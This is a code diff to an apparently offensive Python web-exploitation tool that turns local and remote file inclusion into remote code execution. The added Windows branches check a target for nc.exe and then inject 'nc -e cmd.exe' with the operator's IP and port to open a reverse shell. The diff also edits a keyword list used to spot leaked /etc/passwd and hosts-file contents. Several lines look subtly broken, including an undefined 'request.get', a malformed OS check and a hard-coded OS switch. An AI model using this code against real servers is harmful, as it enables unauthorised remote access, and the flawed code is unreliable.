@@ -247,7 +247,7 @@ def test_php_input(url):
 
             if(checkPayload(res)):
                 tempUrl = u.replace('ipconfig', 'TMP')
-                getExploit(res, 'POST', 'RCE', tempUrl, posts[l], headers, 'INPUT', 'LINUX')
+                getExploit(res, 'POST', 'RCE', tempUrl, posts[l], headers, 'INPUT', 'WINDOWS')
                 print("[+] RCE -> " + u + " -> HTTP POST: " + posts[l])
     
     if(args.revshell):
@@ -322,13 +322,13 @@ def test_rfi(url):
 
 #Checks if sent payload is executed, key word check in response
 def checkPayload(webResponse):
-    KEY_WORDS = ["root:x:0:0", "www-data:", "HTTP_USER_AGENT",
+    KEY_WORDS = ["root:x:0:0", "www-data:",
                 "cm9vdDp4OjA6MD", "Ond3dy1kYXRhO", "ebbg:k:0:0",
                 "jjj-qngn:k", "daemon:x:1:", "r o o t : x : 0 : 0",
                 "; for 16-bit app support", "sample HOSTS file used by Microsoft",
                 "Windows IP Configuration", "OyBmb3IgMT", "; sbe 16-ovg ncc fhccbeg",
                 ";  f o r  1 6 - b i t  a p p", "fnzcyr UBFGF svyr hfrq ol Zvpebfbsg",
-                "c2FtcGxlIEhPU1RT", "=1943785348b45", "/usr/bin/",
+                "c2FtcGxlIEhPU1RT", "=1943785348b45",
                 "window.google=", "961bb08a95dbc34397248d92352da799"]
 
     for i in range(len(KEY_WORDS)):
@@ -353,6 +353,7 @@ def exploit(exploits, method):
         port = args.lport
         
         if(exploit['ATTACK_METHOD'] == method and method == 'INPUT'):
+            #LINUX
             if(exploit['OS'] == 'LINUX'):
                 url = exploit['GETVAL']
                 
@@ -366,9 +367,20 @@ def exploit(exploits, method):
                     print("[i] Sending reverse shell to " + ip + ":" + str(port) + " using nc ...")
                     res = requests.post(u, headers = headers, data = exploit['POSTVAL'], proxies = proxies)
                 return         
-        
+            
+            #WINDOWS
+            elif(exploit['OS'] == 'WINDOWS'):
+                url = exploit['GETVAL']
+                u = url.replace('TMP', 'dir%20C:\Windows\System32')
+                res = requests.post(u, headers = headers, data=exploit['POSTVAL'], proxies = proxies)
+                if('nc.exe' in res.text):
+                    u = url.replace('TMP', "nc+-e+cmd.exe+{0}+{1}".format(ip, port))
+                    print("[i] Sending revese shell to " + ip + ":" + str(port) + " using nc ...")
+                    res = requests.post(u, headers = headers, data = exploit['POSTVAL'], proxies = proxies)
+                return
 
         elif(exploit['ATTACK_METHOD'] == method and method == 'DATA'):
+            #Linux
             if(exploit['OS'] == 'LINUX'):
                 url = exploit['GETVAL']
                 u = url.replace('TMP', 'which%20nc')
@@ -379,8 +391,21 @@ def exploit(exploits, method):
                     res = requests.get(u, headers = headers, proxies = proxies)
                 return
 
+            #Windows
+            else:
+                url = exploit['GETVAL']
+                u = url.replace('TMP', "dir%20C:\Windows\System32")
+                res = requests.get(u, headers = headers, proxies = proxies)
+                if('nc.exe' in res.text):
+                    u = url.replace('TMP', "nc+-e+cmd.exe+{0}+{1}".format(ip, port))
+                    print("[i] Sending reverse shell to " + ip + ":" + str(port) + " using nc ...")
+                    res = requests.get(u, headers = headers, proxies = proxies)
+                return
+
+
 
         elif(exploit['ATTACK_METHOD'] == method and method == 'EXPECT'):
+            #Linux
             if(exploit['OS' == 'LINUX']):
                 url = exploit['GETVAL']
                 u = url.replace('TMP', 'which%20nc')
@@ -390,9 +415,22 @@ def exploit(exploits, method):
                     print("Sending reverse shell to " + ip + ":" + str(port) + " using nc ...")
                     res = requests.get(u, headers = headers, proxies = proxies)
                 return
+            
+            #Windows
+            else:
+                url = exploit['GETVAL']
+                u = url.replace('TMP', "dir%20C:\Windows\System32")
+                res = request.get(u, headers = headers, proxies = proxies)
+                if('nc.exe' in res.text):
+                    u = url.replace('TMP', "nc+-e+cmd.exe+{0}+{1}".format(ip, port))
+                    print("[i] Sending reverse shell to " + ip + ":" + str(port) + " using nc ...")
+                    res = request.get(u, headers = headers, proxies = proxies)
+                return
+
 
 
         elif(exploit['ATTACK_METHOD'] == method and method == 'TRUNC'):
+            #LINUX
             if(exploit['OS'] == 'LINUX'):
                 url = exploit['GETVAL']
                 
